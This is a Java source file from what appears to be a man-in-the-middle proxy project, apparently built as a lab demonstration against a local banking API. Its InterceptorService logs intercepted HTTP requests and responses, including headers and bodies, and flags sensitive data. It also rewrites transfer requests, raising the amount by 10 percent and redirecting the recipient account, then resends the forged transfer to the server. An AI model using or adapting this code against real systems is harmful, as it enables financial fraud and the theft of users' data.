package com.mim.attacker.service;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.mim.attacker.config.ProxyServerComponent;
import com.mim.attacker.util.DataManipulator;
import com.mim.attacker.util.ResponseAnalyzer;
import io.netty.handler.codec.http.*;
import io.netty.buffer.ByteBuf;
import io.netty.util.CharsetUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Collectors;

@Service
public class InterceptorService {
    private final ObjectMapper objectMapper;
    private final LoggingService loggingService;
    private static final Logger log = LoggerFactory.getLogger(InterceptorService.class);


    private final HttpClient httpClient;
    public InterceptorService(LoggingService loggingService) {
        this.objectMapper = new ObjectMapper();
        this.loggingService = loggingService;
        this.httpClient = HttpClient.newHttpClient();
    }

    public void processRequest(FullHttpRequest fullRequest) {
        String method = fullRequest.method().name();
        String uri = fullRequest.uri();
        String headers = fullRequest.headers().entries().stream()
                .map(header -> header.getKey() + ":" + header.getValue())
                .collect(Collectors.joining("; "));

        String payload = "";
        if (HttpMethod.POST.equals(fullRequest.method()) || HttpMethod.PUT.equals(fullRequest.method())) {
            ByteBuf content = fullRequest.content();
            payload = content.toString(CharsetUtil.UTF_8);
        }
        log.info("Writing intercepted request to csv file");
        loggingService.logToCsv("Request", method, uri, "-", headers, payload);

        // Manipulating the transfer request
        if(uri.contains("transfer"))
            manipulateAmountTransferRequest(fullRequest);
    }

    public void processResponse(HttpResponse response) {
        String status = response.status().toString();
        String headers = response.headers().entries().stream()
                .map(header -> header.getKey() + ":" + header.getValue())
                .collect(Collectors.joining("; "));

        String content = "";
        if (response instanceof FullHttpResponse fullResponse) {
            ByteBuf buffer = fullResponse.content();
            if (buffer.isReadable()) {
                content = buffer.toString(CharsetUtil.UTF_8);
            }
            // Checking whether response contains sensitive information or not
            String responseData = fullResponse.content().toString(StandardCharsets.UTF_8);
            if (ResponseAnalyzer.containsSensitiveData(responseData)) {
                log.info("Sensitive data detected in response: " + responseData);
            }
        }
        log.info("Writing intercepted response to csv file");
        loggingService.logToCsv("Response", "-", "-", status, headers, content);

    }

    public void processRequestAsJSON(FullHttpRequest fullRequest)  {
        ObjectNode requestJson = objectMapper.createObjectNode();
        requestJson.put("type", "request");
        requestJson.put("uri", fullRequest.uri());
        requestJson.put("method", fullRequest.method().name());

        ObjectNode headersJson = objectMapper.createObjectNode();
        fullRequest.headers().forEach(header -> headersJson.put(header.getKey(), header.getValue()));
        requestJson.set("headers", headersJson);

        if (fullRequest.method().equals(HttpMethod.POST) || fullRequest.method().equals(HttpMethod.PUT)) {
            ByteBuf content = fullRequest.content();
            requestJson.put("payload", content.toString(CharsetUtil.UTF_8));
        }

        try {
            loggingService.logToJsonFile(requestJson);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void processResponseAsJSON(HttpResponse response) {
        ObjectNode responseJson = objectMapper.createObjectNode();
        responseJson.put("type", "response");
        responseJson.put("status", response.status().toString());

        ObjectNode headersJson = objectMapper.createObjectNode();
        response.headers().forEach(header -> headersJson.put(header.getKey(), header.getValue()));
        responseJson.set("headers", headersJson);

        if (response instanceof FullHttpResponse) {
            FullHttpResponse fullResponse = (FullHttpResponse) response;
            ByteBuf content = fullResponse.content();
            if (content.isReadable()) {
                responseJson.put("content", content.toString(CharsetUtil.UTF_8));
            }
        }

        try {
            loggingService.logToJsonFile(responseJson);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void manipulateAmountTransferRequest(FullHttpRequest fullRequest){
        log.info("Modifying amount transfer request");
        // Extracting parameters for manipulation
        QueryStringDecoder decoder = new QueryStringDecoder(fullRequest.uri());
        String fromAccountId = decoder.parameters().get("fromAccountId").get(0);
        String toAccountId = decoder.parameters().get("toAccountId").get(0);
        double amount = Double.parseDouble(decoder.parameters().get("amount").get(0));

        // Manipulating data
        double manipulatedAmount = DataManipulator.manipulateAmount(amount, 1.10);
        String redirectedAccountId = DataManipulator.redirectAccount(toAccountId);

        log.info("Amount updated from "+amount+" to "+manipulatedAmount);
        log.info("Account number updated from "+toAccountId+" to "+redirectedAccountId);

//        // Reconstructing the URI with manipulated parameters
//        String newUri = String.format("api/banking/transfer?fromAccountId=%s&toAccountId=%s&amount=%.2f",
//                fromAccountId, redirectedAccountId, manipulatedAmount);
//        fullRequest.setUri(newUri);

        // Send the request to server once data has been manipulated
        sendRequest(fromAccountId, redirectedAccountId, manipulatedAmount);

    }

    private void sendRequest(String fromAccountId, String toAccountId, double amount) {
        try {
            log.info("Sending request to server after data has been manipulated");
            URI uri = new URI("http://localhost:8085/api/banking/transfer");
            String requestBody = String.format("fromAccountId=%s&toAccountId=%s&amount=%.2f",
                    fromAccountId, toAccountId, amount);

            java.net.http.HttpRequest request = java.net.http.HttpRequest.newBuilder()
                    .uri(uri)
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(java.net.http.HttpRequest.BodyPublishers.ofString(requestBody))
                    .build();
            log.info("Updated URI: "+request.uri());
            CompletableFuture<java.net.http.HttpResponse<String>> response = httpClient.sendAsync(request, java.net.http.HttpResponse.BodyHandlers.ofString());

            response.thenAccept(res -> {
                log.info("Response status code: " + res.statusCode());
                log.info("Response body: " + res.body());
            }).join();
            log.info("Modified request has been sent successfully");
        } catch (Exception e) {
            log.error("Error sending modified request: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
